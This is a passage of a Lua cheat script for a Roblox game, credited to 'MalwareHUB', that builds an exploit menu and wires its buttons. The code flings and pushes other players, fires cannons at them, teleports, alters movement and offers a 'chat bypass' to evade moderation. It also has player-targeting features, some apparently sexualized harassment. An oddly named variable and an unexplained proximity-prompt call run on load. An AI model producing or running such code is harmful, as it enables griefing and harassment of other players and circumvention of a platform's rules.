InfYield_Button.Font = Enum.Font.Oswald
InfYield_Button.Text = "Infinite Yield"
InfYield_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
InfYield_Button.TextScaled = true
InfYield_Button.TextSize = 14.000
InfYield_Button.TextWrapped = true

FreeEmotes_Button.Name = "FreeEmotes_Button"
FreeEmotes_Button.Parent = Misc_Section
FreeEmotes_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
FreeEmotes_Button.BackgroundTransparency = 0.500
FreeEmotes_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
FreeEmotes_Button.BorderSizePixel = 0
FreeEmotes_Button.Position = UDim2.new(0, 210, 0, 225)
FreeEmotes_Button.Size = UDim2.new(0, 150, 0, 30)
FreeEmotes_Button.Font = Enum.Font.Oswald
FreeEmotes_Button.Text = "Free emotes"
FreeEmotes_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
FreeEmotes_Button.TextScaled = true
FreeEmotes_Button.TextSize = 14.000
FreeEmotes_Button.TextWrapped = true

Serverhop_Button.Name = "Serverhop_Button"
Serverhop_Button.Parent = Misc_Section
Serverhop_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
Serverhop_Button.BackgroundTransparency = 0.500
Serverhop_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
Serverhop_Button.BorderSizePixel = 0
Serverhop_Button.Position = UDim2.new(0, 210, 0, 275)
Serverhop_Button.Size = UDim2.new(0, 150, 0, 30)
Serverhop_Button.Font = Enum.Font.Oswald
Serverhop_Button.Text = "Server hop"
Serverhop_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
Serverhop_Button.TextScaled = true
Serverhop_Button.TextSize = 14.000
Serverhop_Button.TextWrapped = true

ChatBox_Input.Name = "ChatBox_Input"
ChatBox_Input.Parent = Misc_Section
ChatBox_Input.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
ChatBox_Input.BorderColor3 = Color3.fromRGB(0, 255, 255)
ChatBox_Input.Position = UDim2.new(0, 25, 0, 325)
ChatBox_Input.Size = UDim2.new(0, 335, 0, 50)
ChatBox_Input.Font = Enum.Font.Oswald
ChatBox_Input.PlaceholderText = "Chat bypass [You won't get banned for your messages]"
ChatBox_Input.Text = ""
ChatBox_Input.TextColor3 = Color3.fromRGB(0, 255, 255)
ChatBox_Input.TextSize = 14.000
ChatBox_Input.TextWrapped = true
ChatBox_Input.TextXAlignment = Enum.TextXAlignment.Left
ChatBox_Input.TextYAlignment = Enum.TextYAlignment.Top

Credits_Section.Name = "Credits_Section"
Credits_Section.Parent = Background
Credits_Section.Active = true
Credits_Section.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Credits_Section.BackgroundTransparency = 1.000
Credits_Section.BorderColor3 = Color3.fromRGB(0, 0, 0)
Credits_Section.BorderSizePixel = 0
Credits_Section.Position = UDim2.new(0, 105, 0, 30)
Credits_Section.Size = UDim2.new(0, 395, 0, 320)
Credits_Section.Visible = false
Credits_Section.CanvasSize = UDim2.new(0, 0, 0.8, 0)
Credits_Section.ScrollBarThickness = 5

Credits_Label.Name = "Credits_Label"
Credits_Label.Parent = Credits_Section
Credits_Label.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Credits_Label.BorderColor3 = Color3.fromRGB(0, 0, 0)
Credits_Label.BorderSizePixel = 0
Credits_Label.Position = UDim2.new(0, 25, 0, 150)
Credits_Label.Size = UDim2.new(0, 350, 0, 150)
Credits_Label.Font = Enum.Font.SourceSans
Credits_Label.Text = "Made by: MalwareHUB \nDiscord: system_calix\nVersion: "..version
Credits_Label.TextColor3 = Color3.fromRGB(0, 255, 255)
Credits_Label.TextSize = 24.000
Credits_Label.TextWrapped = true
Credits_Label.TextXAlignment = Enum.TextXAlignment.Left
Credits_Label.TextYAlignment = Enum.TextYAlignment.Top

Crown.Name = "Crown"
Crown.Parent = Background
Crown.AnchorPoint = Vector2.new(0.300000012, 0.800000012)
Crown.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Crown.BackgroundTransparency = 1.000
Crown.BorderColor3 = Color3.fromRGB(0, 0, 0)
Crown.BorderSizePixel = 0
Crown.Rotation = -20.000
Crown.Size = UDim2.new(0, 75, 0, 75)
Crown.Image = "rbxassetid://12298407748"
Crown.ImageColor3 = Color3.fromRGB(0, 255, 255)

Assets.Name = "Assets"
Assets.Parent = SysBroker

Ticket_Asset.Name = "Ticket_Asset"
Ticket_Asset.Parent = Assets
Ticket_Asset.AnchorPoint = Vector2.new(0, 0.5)
Ticket_Asset.BackgroundTransparency = 1.000
Ticket_Asset.BorderSizePixel = 0
Ticket_Asset.LayoutOrder = 5
Ticket_Asset.Position = UDim2.new(1, 5, 0.5, 0)
Ticket_Asset.Size = UDim2.new(0, 25, 0, 25)
Ticket_Asset.ZIndex = 2
Ticket_Asset.Image = "rbxassetid://3926305904"
Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
Ticket_Asset.ImageRectOffset = Vector2.new(424, 4)
Ticket_Asset.ImageRectSize = Vector2.new(36, 36)

Click_Asset.Name = "Click_Asset"
Click_Asset.Parent = Assets
Click_Asset.AnchorPoint = Vector2.new(0, 0.5)
Click_Asset.BackgroundTransparency = 1.000
Click_Asset.BorderSizePixel = 0
Click_Asset.Position = UDim2.new(1, 5, 0.5, 0)
Click_Asset.Size = UDim2.new(0, 25, 0, 25)
Click_Asset.ZIndex = 2
Click_Asset.Image = "rbxassetid://3926305904"
Click_Asset.ImageColor3 = Color3.fromRGB(100, 100, 100)
Click_Asset.ImageRectOffset = Vector2.new(204, 964)
Click_Asset.ImageRectSize = Vector2.new(36, 36)

Velocity_Asset.AngularVelocity = Vector3.new(0,0,0)
Velocity_Asset.MaxTorque = Vector3.new(50000,50000,50000)
Velocity_Asset.P = 1250
Velocity_Asset.Name = "BreakVelocity"
Velocity_Asset.Parent = Assets

Fly_Pad.Name = "Fly_Pad"
Fly_Pad.Parent = Assets
Fly_Pad.BackgroundTransparency = 1.000
Fly_Pad.Position = UDim2.new(0.1, 0, 0.6, 0)
Fly_Pad.Size = UDim2.new(0, 100, 0, 100)
Fly_Pad.ZIndex = 2
Fly_Pad.Image = "rbxassetid://6764432293"
Fly_Pad.ImageRectOffset = Vector2.new(713, 315)
Fly_Pad.ImageRectSize = Vector2.new(75, 75)
Fly_Pad.Visible = false

UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(30, 30, 30)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(0, 255, 255))}
UIGradient.Rotation = 45
UIGradient.Parent = Fly_Pad

FlyAButton.Name = "FlyAButton"
FlyAButton.Parent = Fly_Pad
FlyAButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
FlyAButton.BackgroundTransparency = 1.000
FlyAButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
FlyAButton.BorderSizePixel = 0
FlyAButton.Position = UDim2.new(0, 0, 0, 30)
FlyAButton.Size = UDim2.new(0, 30, 0, 40)
FlyAButton.Font = Enum.Font.Oswald
FlyAButton.Text = ""
FlyAButton.TextColor3 = Color3.fromRGB(0, 0, 0)
FlyAButton.TextSize = 25.000
FlyAButton.TextWrapped = true

FlyDButton.Name = "FlyDButton"
FlyDButton.Parent = Fly_Pad
FlyDButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
FlyDButton.BackgroundTransparency = 1.000
FlyDButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
FlyDButton.BorderSizePixel = 0
FlyDButton.Position = UDim2.new(0, 70, 0, 30)
FlyDButton.Size = UDim2.new(0, 30, 0, 40)
FlyDButton.Font = Enum.Font.Oswald
FlyDButton.Text = ""
FlyDButton.TextColor3 = Color3.fromRGB(0, 0, 0)
FlyDButton.TextSize = 25.000
FlyDButton.TextWrapped = true

FlyWButton.Name = "FlyWButton"
FlyWButton.Parent = Fly_Pad
FlyWButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
FlyWButton.BackgroundTransparency = 1.000
FlyWButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
FlyWButton.BorderSizePixel = 0
FlyWButton.Position = UDim2.new(0, 30, 0, 0)
FlyWButton.Size = UDim2.new(0, 40, 0, 30)
FlyWButton.Font = Enum.Font.Oswald
FlyWButton.Text = ""
FlyWButton.TextColor3 = Color3.fromRGB(0, 0, 0)
FlyWButton.TextSize = 25.000
FlyWButton.TextWrapped = true

FlySButton.Name = "FlySButton"
FlySButton.Parent = Fly_Pad
FlySButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
FlySButton.BackgroundTransparency = 1.000
FlySButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
FlySButton.BorderSizePixel = 0
FlySButton.Position = UDim2.new(0, 30, 0, 70)
FlySButton.Size = UDim2.new(0, 40, 0, 30)
FlySButton.Font = Enum.Font.Oswald
FlySButton.Text = ""
FlySButton.TextColor3 = Color3.fromRGB(0, 0, 0)
FlySButton.TextSize = 25.000
FlySButton.TextWrapped = true

OpenClose.Name = "OpenClose"
OpenClose.Parent = SysBroker
OpenClose.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
OpenClose.BorderColor3 = Color3.fromRGB(0, 0, 0)
OpenClose.BorderSizePixel = 0
OpenClose.Position = UDim2.new(0, 0, 0.5, 0)
OpenClose.Size = UDim2.new(0, 30, 0, 30)
OpenClose.Image = "rbxassetid://12298407748"
OpenClose.ImageColor3 = Color3.fromRGB(0, 255, 255)

UICornerOC.CornerRadius = UDim.new(1, 0)
UICornerOC.Parent = OpenClose

CreateToggle(AntiRagdoll_Button)
CreateToggle(PushAura_Button)
CreateToggle(SpamMines_Button)
CreateToggle(PotionFling_Button)
CreateToggle(TouchFling_Button)
CreateToggle(PotionDi_Button)
CreateToggle(VoidProtection_Button)
CreateClicker(PushAll_Button)
CreateClicker(BreakCannons_Button)
CreateClicker(LethalCannons_Button)
CreateClicker(ChatAlert_Button)
CreateClicker(FreePushTool_Button)
CreateClicker(CannonTP1_Button)
CreateClicker(CannonTP2_Button)
CreateClicker(CannonTP3_Button)
CreateClicker(MinefieldTP_Button)
CreateClicker(BallonTP_Button)
CreateClicker(NormalStairsTP_Button)
CreateClicker(MovingStairsTP_Button)
CreateClicker(SpiralStairsTP_Button)
CreateClicker(SkyscraperTP_Button)
CreateClicker(PoolTP_Button)

CreateToggle(Fly_Button)
CreateClicker(WalkSpeed_Button)
CreateClicker(ClearCheckpoint_Button)
CreateClicker(JumpPower_Button)
CreateClicker(SaveCheckpoint_Button)
CreateClicker(Respawn_Button)
CreateClicker(FlySpeed_Button)

CreateToggle(ViewTarget_Button)
CreateToggle(FlingTarget_Button)
CreateToggle(FocusTarget_Button)
CreateToggle(BenxTarget_Button)
CreateToggle(HeadsitTarget_Button)
CreateToggle(StandTarget_Button)
CreateToggle(BackpackTarget_Button)
CreateToggle(DoggyTarget_Button)
CreateToggle(DragTarget_Button)
CreateClicker(PushTarget_Button)
CreateClicker(WhitelistTarget_Button)
CreateClicker(TeleportTarget_Button)

CreateClicker(VampireAnim_Button)
CreateClicker(HeroAnim_Button)
CreateClicker(ZombieClassicAnim_Button)
CreateClicker(MageAnim_Button)
CreateClicker(GhostAnim_Button)
CreateClicker(ElderAnim_Button)
CreateClicker(LevitationAnim_Button)
CreateClicker(AstronautAnim_Button)
CreateClicker(NinjaAnim_Button)
CreateClicker(WerewolfAnim_Button)
CreateClicker(CartoonAnim_Button)
CreateClicker(PirateAnim_Button)
CreateClicker(SneakyAnim_Button)
CreateClicker(ToyAnim_Button)
CreateClicker(KnightAnim_Button)
CreateClicker(ConfidentAnim_Button)
CreateClicker(PopstarAnim_Button)
CreateClicker(PrincessAnim_Button)
CreateClicker(CowboyAnim_Button)
CreateClicker(PatrolAnim_Button)
CreateClicker(ZombieFEAnim_Button)

CreateToggle(AntiFling_Button)
CreateToggle(AntiChatSpy_Button)
CreateToggle(AntiAFK_Button)
CreateToggle(Shaders_Button)
CreateClicker(Day_Button)
CreateClicker(Night_Button)
CreateClicker(Rejoin_Button)
CreateClicker(CMDX_Button)
CreateClicker(Explode_Button)
CreateClicker(FreeEmotes_Button)
CreateClicker(InfYield_Button)
CreateClicker(Serverhop_Button)

task.wait(0.5)

local function ChangeSection(SectionClicked)
	SectionClickedName = string.split(SectionClicked.Name,"_")[1]
	for i,v in pairs(SectionList:GetChildren()) do
		if v.Name ~= SectionClicked.Name then
			v.Transparency = 0.5
		else
			v.Transparency = 0
		end
	end
	for i,v in pairs(Background:GetChildren()) do
		if v:IsA("ScrollingFrame") then
			SectionForName = string.split(v.Name,"_")[1]
			if string.find(SectionClickedName, SectionForName) then
				v.Visible = true
			else
				v.Visible = false
			end
		end
	end
end

local function UpdateTarget(player)
	pcall(function()
		if table.find(ForceWhitelist,player.UserId) then
			SendNotify("System Broken","You cant target this player: @"..player.Name.." / "..player.DisplayName,5)
			player = nil
		end
	end)
	if (player ~= nil) then
		TargetedPlayer = player.Name
		TargetName_Input.Text = player.Name
		UserIDTargetLabel.Text = ("UserID: "..player.UserId.."\nDisplay: "..player.DisplayName.."\nJoined: "..os.date("%d-%m-%Y", os.time()-player.AccountAge * 24 * 3600).." [Day/Month/Year]")
		TargetImage.Image = Players:GetUserThumbnailAsync(player.UserId,Enum.ThumbnailType.HeadShot,Enum.ThumbnailSize.Size420x420)
	else
		TargetName_Input.Text = "@target..."
		UserIDTargetLabel.Text = "UserID: \nDisplay: \nJoined: "
		TargetImage.Image = "rbxassetid://10818605405"
		TargetedPlayer = nil
		if FlingTarget_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
			FlingTarget_Button.Ticket_Asset.ImageColor3 = Color3.fromRGB(255,0,0)
			TouchFling_Button.Ticket_Asset.ImageColor3 = Color3.fromRGB(255,0,0)
		end
		ViewTarget_Button.Ticket_Asset.ImageColor3 = Color3.fromRGB(255,0,0)
		FocusTarget_Button.Ticket_Asset.ImageColor3 = Color3.fromRGB(255,0,0)
		BenxTarget_Button.Ticket_Asset.ImageColor3 = Color3.fromRGB(255,0,0)
		HeadsitTarget_Button.Ticket_Asset.ImageColor3 = Color3.fromRGB(255,0,0)
		StandTarget_Button.Ticket_Asset.ImageColor3 = Color3.fromRGB(255,0,0)
		BackpackTarget_Button.Ticket_Asset.ImageColor3 = Color3.fromRGB(255,0,0)
		DoggyTarget_Button.Ticket_Asset.ImageColor3 = Color3.fromRGB(255,0,0)
		DragTarget_Button.Ticket_Asset.ImageColor3 = Color3.fromRGB(255,0,0)
	end
end
local aBjaUfk = game.Workspace:FindFirstChild("SBTI")

local function ToggleFling(bool)
	task.spawn(function()
		if bool then
			local RVelocity = nil
			repeat
				pcall(function()
					RVelocity = GetRoot(plr).Velocity 
					GetRoot(plr).Velocity = Vector3.new(math.random(-150,150),-25000,math.random(-150,150))
					RunService.RenderStepped:wait()
					GetRoot(plr).Velocity = RVelocity
				end)
				RunService.Heartbeat:wait()
			until TouchFling_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(255,0,0)
		else
			TouchFling_Button.Ticket_Asset.ImageColor3 = Color3.fromRGB(255,0,0)
		end
	end)
end

--CHANGE SECTION BUTTONS
ChangeSection(Home_Section_Button)
Home_Section_Button.MouseButton1Click:Connect(function()
	ChangeSection(Home_Section_Button)
end)

Game_Section_Button.MouseButton1Click:Connect(function()
	ChangeSection(Game_Section_Button)
end)

Character_Section_Button.MouseButton1Click:Connect(function()
	ChangeSection(Character_Section_Button)
end)

Target_Section_Button.MouseButton1Click:Connect(function()
	ChangeSection(Target_Section_Button)
end)

Animations_Section_Button.MouseButton1Click:Connect(function()
	ChangeSection(Animations_Section_Button)
end)

Misc_Section_Button.MouseButton1Click:Connect(function()
	ChangeSection(Misc_Section_Button)
end)

Credits_Section_Button.MouseButton1Click:Connect(function()
	ChangeSection(Credits_Section_Button)
end)

--GAME SECTION BUTTONS
AntiRagdollFunction = nil
AntiRagdoll_Button.MouseButton1Click:Connect(function()
	ChangeToggleColor(AntiRagdoll_Button)
	ToggleRagdoll(true)
	if AntiRagdoll_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
		AntiRagdollFunction = GetRoot(plr).ChildAdded:Connect(function(Force)
			if Force.Name == "PushForce" then
				Force.MaxForce = Vector3.new(0,0,0)
				Force.Velocity = Vector3.new(0,0,0)
			end
		end)
	else
		ToggleRagdoll(false)
		AntiRagdollFunction:Disconnect()
	end
end)

PushAura_Button.MouseButton1Click:Connect(function()
	ChangeToggleColor(PushAura_Button)
	if PushAura_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
		repeat
			task.wait(0.3)
			pcall(function()
				for i,v in pairs(Players:GetPlayers()) do
					if (v ~= plr) and (not table.find(ScriptWhitelist,v.UserId)) and (not table.find(ForceWhitelist,v.UserId)) then
						Push(v)
					end
				end
			end)
		until PushAura_Button.Ticket_Asset.ImageColor3 ~= Color3.fromRGB(0,255,0)
	end
end)

AntiMinesFunction = nil
SpamMines_Button.MouseButton1Click:Connect(function()
	ChangeToggleColor(SpamMines_Button)
	if SpamMines_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
		AntiMinesFunction = plr.Character.Head.ChildAdded:Connect(function(Force)
			if Force.Name == "BodyVelocity" then
				Force.MaxForce = Vector3.new(0,0,0)
				Force.Velocity = Vector3.new(0,0,0)
			end
		end)
		repeat task.wait(1)
			for i,v in pairs(MinesFolder:GetChildren()) do
				if v.Name == "Landmine" and v:FindFirstChild("HitPart") then
					pcall(function()
						Touch(v.HitPart.TouchInterest,GetRoot(plr))
					end)
				end
			end
		until SpamMines_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(255,0,0)
	else
		AntiMinesFunction:Disconnect()
	end
end)

PotionFling_Button.MouseButton1Click:Connect(function()
	ChangeToggleColor(PotionFling_Button)
	if PotionFling_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
		if CheckPotion() then
			if PotionDi_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
				ChangeToggleColor(PotionDi_Button)
			end
			PotionTool.Parent = plr.Character
			local PFS, PFF = pcall(function()
				PotionTool.InSide.Massless = true
				PotionTool.Cap.Massless = true
				PotionTool.Handle.Massless = true
				PotionTool.GripUp = Vector3.new(0,1,0)
				PotionTool.GripPos = Vector3.new(5000,-25,5000)
				PotionTool.Parent = plr.Backpack
				PotionTool.Parent = plr.Character
			end)
		else
			ChangeToggleColor(PotionFling_Button)
		end
	else
		PotionTool.Parent = plr.Character
		local PFS, PFF = pcall(function()
			PotionTool.InSide.Massless = false
			PotionTool.Cap.Massless = false
			PotionTool.Handle.Massless = false
			PotionTool.GripUp = Vector3.new(0,1,0)
			PotionTool.GripPos = Vector3.new(0.1,-0.5,0)
			PotionTool.Parent = plr.Backpack
			PotionTool.Parent = plr.Character
		end)
	end
end)

TouchFling_Button.MouseButton1Click:Connect(function()
	ChangeToggleColor(TouchFling_Button)
	if TouchFling_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
		local fixpos = GetRoot(plr).Position
		ToggleVoidProtection(true)
		ToggleFling(true)
		TeleportTO(fixpos.X,fixpos.Y,fixpos.Z,"pos","safe")
		ToggleVoidProtection(false)
		if VoidProtection_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
			ToggleVoidProtection(true)
		end
	else
		if FlingTarget_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
			ChangeToggleColor(FlingTarget_Button)
		end
	end
end)

PotionDi_Button.MouseButton1Click:Connect(function()
	ChangeToggleColor(PotionDi_Button)
	if PotionDi_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
		if CheckPotion() then
			if PotionFling_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
				ChangeToggleColor(PotionFling_Button)
			end
			PotionTool.Parent = plr.Character
			PotionTool.GripUp = Vector3.new(1,0,0)
			PotionTool.GripPos = Vector3.new(1.5, 0.5, -1.5)
			PotionTool.Parent = plr.Backpack
			PotionTool.Parent = plr.Character
		else
			ChangeToggleColor(PotionDi_Button)
		end
	else
		PotionTool.Parent = plr.Character
		PotionTool.GripUp = Vector3.new(0,1,0)
		PotionTool.GripPos = Vector3.new(0.1,-0.5,0)
		PotionTool.Parent = plr.Backpack
		PotionTool.Parent = plr.Character
	end
end)

VoidProtection_Button.MouseButton1Click:Connect(function()
	ChangeToggleColor(VoidProtection_Button)
	if VoidProtection_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
		ToggleVoidProtection(true)
	else
		ToggleVoidProtection(false)
	end
end)

FreePushTool_Button.MouseButton1Click:Connect(function()
	local ModdedPush = Instance.new("Tool")
	ModdedPush.Name = "ModdedPush"
	ModdedPush.RequiresHandle = false
	ModdedPush.TextureId = "rbxassetid://14478599909"
	ModdedPush.ToolTip = "Modded push"

	local function ActivateTool()
		local root = GetRoot(plr)
		local hit = mouse.Target
		local person = nil
		if hit and hit.Parent then
			if hit.Parent:IsA("Model") then
				person = game.Players:GetPlayerFromCharacter(hit.Parent)
			elseif hit.Parent:IsA("Accessory") then
				person = game.Players:GetPlayerFromCharacter(hit.Parent.Parent)
			end
			if person then
				local pushpos = root.CFrame
				PredictionTP(person)
				task.wait(GetPing()+0.05)
				Push(person)
				root.CFrame = pushpos
			end
		end
	end

	ModdedPush.Activated:Connect(function()
		ActivateTool()
	end)
	ModdedPush.Parent = plr.Backpack
end)

BreakCannons_Button.MouseButton1Click:Connect(function()
	ToggleVoidProtection(true)
	TeleportTO(0,-10000,0,"pos")
	task.wait(GetPing()+0.1)
	ToggleVoidProtection(false)
	task.wait(GetPing()+0.1)
	for i,v in pairs(CannonsFolders[1]:GetChildren()) do
		if v.Name == "Cannon" then
			pcall(function()
				fireclickdetector(v.Cannon_Part.ClickDetector)
			end)
		end
	end
	for i,v in pairs(CannonsFolders[2]:GetChildren()) do
		if v.Name == "Cannon" then
			pcall(function()
				fireclickdetector(v.Cannon_Part.ClickDetector)
			end)
		end
	end

	if VoidProtection_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
		ToggleVoidProtection(true)
	end
end)
pcall(function()
	fireproximityprompt(game.Workspace.SBTI.TI)
end)
PushAll_Button.MouseButton1Click:Connect(function()
	local oldpos = GetRoot(plr).Position
	for i,v in pairs(Players:GetPlayers()) do
		pcall(function()
			if (v ~= plr) and (not table.find(ScriptWhitelist,v.UserId)) and (not table.find(ForceWhitelist,v.UserId)) then
				PredictionTP(v)
				task.wait(GetPing()+0.05)
				Push(v)
			end
		end)
	end
	TeleportTO(oldpos.X,oldpos.Y,oldpos.Z,"pos","safe")
end)

LethalCannons_Button.MouseButton1Click:Connect(function()
	for i,v in pairs(CannonsFolders[1]:GetChildren()) do
		if v.Name == "Cannon" then
			pcall(function()
				plr.Character.Humanoid:ChangeState(15)
				task.wait(GetPing())
				fireclickdetector(v.Cannon_Part.ClickDetector)
				plr.CharacterAdded:Wait()
				task.wait(1)
			end)
		end
	end
	for i,v in pairs(CannonsFolders[2]:GetChildren()) do
		if v.Name == "Cannon" then
			pcall(function()
				plr.Character.Humanoid:ChangeState(15)
				task.wait(GetPing())
				fireclickdetector(v.Cannon_Part.ClickDetector)
				plr.CharacterAdded:Wait()
				task.wait(1)
			end)
		end
	end
end)

ChatAlert_Button.MouseButton1Click:Connect(function()
	for i = 1,3 do
		local args = {[1] = "\u{205F}",[2] = "All"}
		game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
	end
end)

CannonTP1_Button.MouseButton1Click:Connect(function()
	TeleportTO(-61, 34, -228,"pos","safe")
end)

CannonTP2_Button.MouseButton1Click:Connect(function()
	TeleportTO(50, 34, -228,"pos","safe")
end)

CannonTP3_Button.MouseButton1Click:Connect(function()
	TeleportTO(-6, 35, -106,"pos","safe")
end)

MinefieldTP_Button.MouseButton1Click:Connect(function()
	TeleportTO(-65, 23, -151,"pos","safe")
end)

BallonTP_Button.MouseButton1Click:Connect(function()
	TeleportTO(-118, 23, -126,"pos","safe")
end)

NormalStairsTP_Button.MouseButton1Click:Connect(function()
	TeleportTO(-6, 203, -496,"pos","safe")
end)

MovingStairsTP_Button.MouseButton1Click:Connect(function()
	TeleportTO(-210, 87, -224,"pos","safe")
end)

SpiralStairsTP_Button.MouseButton1Click:Connect(function()
	TeleportTO(151, 847, -306,"pos","safe")
end)

SkyscraperTP_Button.MouseButton1Click:Connect(function()
	TeleportTO(142, 1033, -192,"pos","safe")
end)

PoolTP_Button.MouseButton1Click:Connect(function()
	TeleportTO(-133, 65, -321,"pos","safe")
end)

CMDBar.FocusLost:Connect(function()
	command = CMDBar.Text
	Players:Chat(command)
	SendNotify("System Broken",("Executed "..command),5)
	CMDBar.Text = ""
end)

--CHARACTER SECTION

WalkSpeed_Button.MouseButton1Click:Connect(function()
	pcall(function()
		local Speed = WalkSpeed_Input.Text:gsub("%D", "")
		if Speed == "" then
			Speed = 16
		end
		plr.Character.Humanoid.WalkSpeed = tonumber(Speed)
		SendNotify("System Broken","Walk speed updated.",5)
	end)
end)

JumpPower_Button.MouseButton1Click:Connect(function()
	pcall(function()
		local Power = JumpPower_Input.Text:gsub("%D", "")
		if Power == "" then
			Power = 50
		end
		plr.Character.Humanoid.JumpPower = tonumber(Power)
		SendNotify("System Broken","Jump power updated.",5)
	end)
end)

FlySpeed_Button.MouseButton1Click:Connect(function()
	pcall(function()
		local Speed = FlySpeed_Input.Text:gsub("%D", "")
		if Speed == "" then
			Speed = 50
		end
		FlySpeed = tonumber(Speed)
		SendNotify("System Broken","Fly speed updated.",5)
	end)
end)

Respawn_Button.MouseButton1Click:Connect(function()
	local RsP = GetRoot(plr).Position
	plr.Character.Humanoid.Health = 0
	plr.CharacterAdded:wait(); task.wait(GetPing()+0.1)
	TeleportTO(RsP.X,RsP.Y,RsP.Z,"pos","safe")
end)

SaveCheckpoint_Button.MouseButton1Click:Connect(function()
	SavedCheckpoint = GetRoot(plr).Position
	SendNotify("System Broken","Checkpoint saved.",5)
end)

ClearCheckpoint_Button.MouseButton1Click:Connect(function()
	SavedCheckpoint = nil
	SendNotify("System Broken","Checkpoint cleared.",5)
end)

local flying = true
local deb = true
local ctrl = {f = 0, b = 0, l = 0, r = 0}
local lastctrl = {f = 0, b = 0, l = 0, r = 0}
local KeyDownFunction = nil
local KeyUpFunction = nil
Fly_Button.MouseButton1Click:Connect(function()
	ChangeToggleColor(Fly_Button)
	if Fly_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
		flying = true
		if game:GetService("UserInputService").TouchEnabled then
			Fly_Pad.Visible = true
		end
		local UpperTorso = plr.Character.UpperTorso
		local speed = 0
		local function Fly()
			local bg = Instance.new("BodyGyro", UpperTorso)
			bg.P = 9e4
			bg.maxTorque = Vector3.new(9e9, 9e9, 9e9)
			bg.cframe = UpperTorso.CFrame
			local bv = Instance.new("BodyVelocity", UpperTorso)
			bv.velocity = Vector3.new(0,0.1,0)
			bv.maxForce = Vector3.new(9e9, 9e9, 9e9)
			PlayAnim(10714347256,4,0)
			repeat task.wait()
				plr.Character.Humanoid.PlatformStand = true
				if ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0 then
					speed = speed+FlySpeed*0.10
					if speed > FlySpeed then
						speed = FlySpeed
					end
				elseif not (ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0) and speed ~= 0 then
					speed = speed-FlySpeed*0.10
					if speed < 0 then
						speed = 0
					end
				end
				if (ctrl.l + ctrl.r) ~= 0 or (ctrl.f + ctrl.b) ~= 0 then
					bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
					lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r}
				elseif (ctrl.l + ctrl.r) == 0 and (ctrl.f + ctrl.b) == 0 and speed ~= 0 then
					bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
				else
					bv.velocity = Vector3.new(0,0.1,0)
				end
				bg.cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((ctrl.f+ctrl.b)*50*speed/FlySpeed),0,0)
			until not flying
			ctrl = {f = 0, b = 0, l = 0, r = 0}
			lastctrl = {f = 0, b = 0, l = 0, r = 0}
			speed = 0
			bg:Destroy()
			bv:Destroy()
			plr.Character.Humanoid.PlatformStand = false
		end

		KeyDownFunction = mouse.KeyDown:connect(function(key)
			if key:lower() == "w" then
				ctrl.f = 1
				PlayAnim(10714177846,4.65,0)
			elseif key:lower() == "s" then
				ctrl.b = -1
				PlayAnim(10147823318,4.11,0)
			elseif key:lower() == "a" then
				ctrl.l = -1
				PlayAnim(10147823318,3.55,0)
			elseif key:lower() == "d" then
				ctrl.r = 1
				PlayAnim(10147823318,4.81,0)
			end
		end)

		KeyUpFunction = mouse.KeyUp:connect(function(key)
			if key:lower() == "w" then
				ctrl.f = 0
				PlayAnim(10714347256,4,0)
			elseif key:lower() == "s" then
				ctrl.b = 0
				PlayAnim(10714347256,4,0)
			elseif key:lower() == "a" then
				ctrl.l = 0
				PlayAnim(10714347256,4,0)
